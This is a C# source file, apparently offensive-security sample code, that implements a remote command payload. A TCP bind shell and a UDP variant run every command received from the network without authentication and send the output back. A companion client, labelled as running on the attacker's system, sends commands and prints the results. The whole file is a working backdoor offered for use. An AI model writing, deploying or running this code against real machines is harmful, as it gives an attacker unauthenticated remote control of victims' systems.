using System;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Linq;
using System.Diagnostics;
using System.Text;
namespace NetPayload
{
     class Program
     {
          static void Main(string[] args) // TCP
          {
               int port = int.Parse(args[0]);
               TcpListener listener = new TcpListener(IPAddress.Any, port);
               try
               {
                    listener.Start();
               }
               catch
               {
                    return;
               }
               while (true)
               {
                    using (Socket socket = listener.AcceptSocket())
                    {
                         using (NetworkStream stream = new NetworkStream(socket))
                         {
                              using (StreamReader rdr = new StreamReader(stream))
                              {
                                   while (true)
                                   {
                                        string cmd = rdr.ReadLine();

                                        if (string.IsNullOrEmpty(cmd))
                                        {
                                             rdr.Close();
                                             stream.Close();
                                             listener.Stop();
                                             break;
                                        }

                                        if (string.IsNullOrWhiteSpace(cmd))
                                             continue;

                                        string[] split = cmd.Trim().Split(' ');
                                        string filename = split.First();
                                        string arg = string.Join(" ", split.Skip(1));

                                        try
                                        {
                                             Process prc = new Process();
                                             prc.StartInfo = new ProcessStartInfo();
                                             prc.StartInfo.FileName = filename;
                                             prc.StartInfo.Arguments = arg;
                                             prc.StartInfo.UseShellExecute = false;
                                             prc.StartInfo.RedirectStandardOutput = true;
                                             prc.Start();
                                             prc.StandardOutput.BaseStream.CopyTo(stream);
                                             prc.WaitForExit();
                                        }
                                        catch
                                        {
                                             string error = "Error running command " + cmd + "\n";
                                             byte[] errorBytes = Encoding.ASCII.GetBytes(error);
                                             stream.Write(errorBytes, 0, errorBytes.Length);
                                        }
                                   }
                              }
                         }
                    }
               }
          }
          public static void OtherMain(string[] args) // UDP Port Payload
          {
               int lport = int.Parse(args[0]);
               using (UdpClient listener = new UdpClient(lport))
               {
                    IPEndPoint localEP = new IPEndPoint(IPAddress.Any, lport);
                    string cmd;
                    byte[] input;

                    while (true)
                    {
                         input = listener.Receive(ref localEP);
                         cmd = Encoding.ASCII.GetString(input, 0, input.Length);
                         if (string.IsNullOrEmpty(cmd))
                         {
                              listener.Close();
                              return;
                         }

                         if (string.IsNullOrWhiteSpace(cmd))
                              continue;

                         string[] split = cmd.Trim().Split(' ');
                         string filename = split.First();
                         string arg = string.Join(" ", split.Skip(1));
                         string results = string.Empty;

                         try
                         {
                              Process prc = new Process();
                              prc.StartInfo = new ProcessStartInfo();
                              prc.StartInfo.FileName = filename;
                              prc.StartInfo.Arguments = arg;
                              prc.StartInfo.UseShellExecute = false;
                              prc.StartInfo.RedirectStandardOutput = true;
                              prc.Start();
                              prc.WaitForExit();
                              results = prc.StandardOutput.ReadToEnd();
                         }
                         catch
                         {
                              results = "There was an error running the command: " + filename;
                         }
                         using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                         {
                              IPAddress sender = localEP.Address;
                              IPEndPoint remoteEP = new IPEndPoint(sender, lport);
                              byte[] resultsBytes = Encoding.ASCII.GetBytes(results);
                              sock.SendTo(resultsBytes, remoteEP);
                         }
                    }
               }
          }
          // Below Code Running on Attacker's System
          static void AnotherMain(string[] args)
          {
               int lport = int.Parse(args[1]);
               using (UdpClient listener = new UdpClient(lport))
               {
                    IPEndPoint localEP = new IPEndPoint(IPAddress.Any, lport);
                    string output;
                    byte[] bytes;

                    using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                    {
                         IPAddress addr = IPAddress.Parse(args[0]);
                         IPEndPoint addrEP = new IPEndPoint(addr, lport);

                         Console.WriteLine("Enter command to send, or a blank line to quit");
                         while (true)
                         {
                              string command = Console.ReadLine();
                              byte[] buff = Encoding.ASCII.GetBytes(command);

                              try
                              {
                                   sock.SendTo(buff, addrEP);

                                   if (string.IsNullOrEmpty(command))
                                   {
                                        sock.Close();
                                        listener.Close();
                                        return;
                                   }

                                   if (string.IsNullOrWhiteSpace(command))
                                        continue;

                                   bytes = listener.Receive(ref localEP);
                                   output = Encoding.ASCII.GetString(bytes, 0, bytes.Length);
                                   Console.WriteLine(output);
                              }
                              catch (Exception ex)
                              {
                                   Console.WriteLine("Exception{0}",ex.Message);
                              }
                         }
                    }
               }
          }
     }
}
